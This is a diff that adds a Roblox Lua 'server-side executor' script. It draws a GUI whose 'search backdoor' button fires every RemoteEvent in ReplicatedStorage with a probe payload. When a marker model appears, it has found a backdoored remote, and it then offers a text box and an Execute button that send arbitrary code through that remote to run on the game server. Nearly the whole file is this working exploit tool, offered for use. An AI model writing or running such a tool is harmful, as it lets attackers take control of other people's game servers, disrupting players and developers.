@@ -1,0 +1,117 @@
+local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
+gui.Name = "skibidihawkexecutor"
+
+local stroke = Instance.new("UIStroke")
+stroke.Thickness = 5
+stroke.Color = Color3.new(1, 1, 1)
+
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(23, 30, 91)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(68, 51, 255))
+})
+
+local frame = Instance.new("Frame", gui)
+local framestroke = stroke:Clone()
+framestroke.Parent = frame
+gradient:Clone().Parent = framestroke
+frame.Size = UDim2.new(0.339, 0, 0.417, 0)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.BorderSizePixel = 0
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.Active = true
+frame.Draggable = true
+
+local button = Instance.new("TextButton", frame)
+button.Size = UDim2.new(1, 0, 0.167, 0)
+button.Position = UDim2.new(0, 0, 0.698, 0)
+button.Text = "😎search backdoor😎"
+button.TextColor3 = Color3.new(1, 1, 1)
+button.TextScaled = true
+button.BackgroundTransparency = 1
+button.BorderSizePixel = 0
+
+local title = Instance.new("TextLabel", frame)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.Size = UDim2.new(1, 0, 0.222, 0)
+title.Text = "skibidihawkexecutor"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextScaled = true
+title.BackgroundTransparency = 1
+title.BorderSizePixel = 0
+
+local backdoor
+local lastFiredRemote = nil
+
+for _, obj in ipairs(workspace:GetDescendants()) do
+	if obj.Name == "skibidihawkexecutormodel" then
+		obj:Destroy()
+	end
+end
+
+workspace.DescendantAdded:Connect(function(obj)
+	if obj.Name == "skibidihawkexecutormodel" and lastFiredRemote then
+		backdoor = lastFiredRemote
+		button:Destroy()
+
+		local scroll = Instance.new("ScrollingFrame", frame)
+		scroll.Size = UDim2.new(1, 0, 0.614, 0)
+		scroll.Position = UDim2.new(0, 0, 0.258, 0)
+		scroll.CanvasSize = UDim2.new(0, 0, 50, 0)
+		scroll.BackgroundTransparency = 1
+		scroll.BorderSizePixel = 0
+
+		local textbox = Instance.new("TextBox", scroll)
+		textbox.Size = UDim2.new(1, 0, 50, 0)
+		textbox.Position = UDim2.new(0, 0, 0, 0)
+		textbox.ClearTextOnFocus = false
+		textbox.Text = ""
+		textbox.PlaceholderText = ""
+		textbox.TextColor3 = Color3.new(1, 1, 1)
+		textbox.TextSize = 36
+		textbox.TextXAlignment = Enum.TextXAlignment.Left
+		textbox.TextYAlignment = Enum.TextYAlignment.Top
+		textbox.BackgroundTransparency = 1
+		textbox.BorderSizePixel = 0
+		textbox.TextWrapped = true
+		textbox.MultiLine = true
+
+		local execButton = Instance.new("TextButton", frame)
+		execButton.Size = UDim2.new(0.308, 0, 0.111, 0)
+		execButton.Position = UDim2.new(0.325, 0, 0.86, 0)
+		execButton.Text = "Execute"
+		execButton.TextColor3 = Color3.new(1, 1, 1)
+		execButton.TextScaled = true
+		execButton.BackgroundTransparency = 1
+		execButton.BorderSizePixel = 0
+
+		local execStroke = stroke:Clone()
+		execStroke.Parent = execButton
+		gradient:Clone().Parent = execStroke
+
+		execButton.MouseButton1Click:Connect(function()
+			local codetorun = textbox.Text
+			if backdoor then
+				backdoor:FireServer(codetorun)
+			end
+		end)
+	end
+end)
+
+button.MouseButton1Click:Connect(function()
+	local code = [[
+		Instance.new("Model", workspace).Name = "skibidihawkexecutormodel"
+	]]
+	for _, event in ipairs(game.ReplicatedStorage:GetDescendants()) do
+		if event:IsA("RemoteEvent") then
+			lastFiredRemote = event
+			event:FireServer(code)
+			game:GetService("RunService").RenderStepped:Wait()
+			if workspace:FindFirstChild("skibidihawkexecutormodel") then
+				backdoor = event
+				break
+			end
+		end
+	end
+end)
